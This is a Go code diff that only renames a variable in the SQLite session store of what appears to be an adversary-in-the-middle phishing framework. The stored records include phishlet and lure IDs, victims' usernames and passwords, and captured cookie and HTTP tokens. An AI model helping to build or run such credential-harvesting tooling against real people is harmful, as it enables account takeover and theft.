@@ -18,26 +18,26 @@ type Sessions struct{ db *DB }
 
 func NewSessions(db *DB) *Sessions { return &Sessions{db: db} }
 
-func (s *Sessions) CreateSession(sess *aitm.Session) error {
-	custom, err := marshalJSON(sess.Custom)
+func (s *Sessions) CreateSession(session *aitm.Session) error {
+	custom, err := marshalJSON(session.Custom)
 	if err != nil {
 		return err
 	}
-	cookies, err := marshalJSON(sess.CookieTokens)
+	cookies, err := marshalJSON(session.CookieTokens)
 	if err != nil {
 		return err
 	}
-	body, err := marshalJSON(sess.BodyTokens)
+	body, err := marshalJSON(session.BodyTokens)
 	if err != nil {
 		return err
 	}
-	httpTok, err := marshalJSON(sess.HttpTokens)
+	httpTok, err := marshalJSON(session.HttpTokens)
 	if err != nil {
 		return err
 	}
 	var completedAt *int64
-	if sess.CompletedAt != nil {
-		t := sess.CompletedAt.Unix()
+	if session.CompletedAt != nil {
+		t := session.CompletedAt.Unix()
 		completedAt = &t
 	}
 	_, err = s.db.db.Exec(`
@@ -46,10 +46,10 @@ func (s *Sessions) CreateSession(sess *aitm.Session) error {
 			 bot_score, username, password, custom, cookie_tokens, body_tokens,
 			 http_tokens, puppet_id, started_at, completed_at)
 		VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
-		sess.ID, sess.Phishlet, sess.LureID, sess.RemoteAddr, sess.UserAgent,
-		sess.JA4Hash, sess.BotScore, sess.Username, sess.Password,
-		custom, cookies, body, httpTok, sess.PuppetID,
-		sess.StartedAt.Unix(), completedAt,
+		session.ID, session.Phishlet, session.LureID, session.RemoteAddr, session.UserAgent,
+		session.JA4Hash, session.BotScore, session.Username, session.Password,
+		custom, cookies, body, httpTok, session.PuppetID,
+		session.StartedAt.Unix(), completedAt,
 	)
 	if isConflict(err) {
 		return store.ErrConflict
@@ -70,14 +70,14 @@ func (s *Sessions) GetSession(id string) (*aitm.Session, error) {
 	return sess, err
 }
 
-func (s *Sessions) UpdateSession(sess *aitm.Session) error {
-	custom, _ := marshalJSON(sess.Custom)
-	cookies, _ := marshalJSON(sess.CookieTokens)
-	body, _ := marshalJSON(sess.BodyTokens)
-	httpTok, _ := marshalJSON(sess.HttpTokens)
+func (s *Sessions) UpdateSession(session *aitm.Session) error {
+	custom, _ := marshalJSON(session.Custom)
+	cookies, _ := marshalJSON(session.CookieTokens)
+	body, _ := marshalJSON(session.BodyTokens)
+	httpTok, _ := marshalJSON(session.HttpTokens)
 	var completedAt *int64
-	if sess.CompletedAt != nil {
-		t := sess.CompletedAt.Unix()
+	if session.CompletedAt != nil {
+		t := session.CompletedAt.Unix()
 		completedAt = &t
 	}
 	res, err := s.db.db.Exec(`
@@ -86,10 +86,10 @@ func (s *Sessions) UpdateSession(sess *aitm.Session) error {
 			bot_score=?, username=?, password=?, custom=?, cookie_tokens=?,
 			body_tokens=?, http_tokens=?, puppet_id=?, started_at=?, completed_at=?
 		WHERE id=?`,
-		sess.Phishlet, sess.LureID, sess.RemoteAddr, sess.UserAgent, sess.JA4Hash,
-		sess.BotScore, sess.Username, sess.Password,
-		custom, cookies, body, httpTok, sess.PuppetID,
-		sess.StartedAt.Unix(), completedAt, sess.ID,
+		session.Phishlet, session.LureID, session.RemoteAddr, session.UserAgent, session.JA4Hash,
+		session.BotScore, session.Username, session.Password,
+		custom, cookies, body, httpTok, session.PuppetID,
+		session.StartedAt.Unix(), completedAt, session.ID,
 	)
 	if err != nil {
 		return err
@@ -165,7 +165,7 @@ func (s *Sessions) ListSessions(f aitm.SessionFilter) ([]*aitm.Session, error) {
 
 func scanSession(row scanner) (*aitm.Session, error) {
 	var (
-		sess        aitm.Session
+		session     aitm.Session
 		startedAt   int64
 		completedAt *int64
 		custom      string
@@ -174,22 +174,22 @@ func scanSession(row scanner) (*aitm.Session, error) {
 		httpTok     string
 	)
 	err := row.Scan(
-		&sess.ID, &sess.Phishlet, &sess.LureID, &sess.RemoteAddr, &sess.UserAgent,
-		&sess.JA4Hash, &sess.BotScore, &sess.Username, &sess.Password,
-		&custom, &cookies, &body, &httpTok, &sess.PuppetID,
+		&session.ID, &session.Phishlet, &session.LureID, &session.RemoteAddr, &session.UserAgent,
+		&session.JA4Hash, &session.BotScore, &session.Username, &session.Password,
+		&custom, &cookies, &body, &httpTok, &session.PuppetID,
 		&startedAt, &completedAt,
 	)
 	if err != nil {
 		return nil, err
 	}
-	sess.StartedAt = time.Unix(startedAt, 0)
+	session.StartedAt = time.Unix(startedAt, 0)
 	if completedAt != nil {
 		t := time.Unix(*completedAt, 0)
-		sess.CompletedAt = &t
+		session.CompletedAt = &t
 	}
-	_ = unmarshalJSON(custom, &sess.Custom)
-	_ = unmarshalJSON(cookies, &sess.CookieTokens)
-	_ = unmarshalJSON(body, &sess.BodyTokens)
-	_ = unmarshalJSON(httpTok, &sess.HttpTokens)
-	return &sess, nil
+	_ = unmarshalJSON(custom, &session.Custom)
+	_ = unmarshalJSON(cookies, &session.CookieTokens)
+	_ = unmarshalJSON(body, &session.BodyTokens)
+	_ = unmarshalJSON(httpTok, &session.HttpTokens)
+	return &session, nil
 }
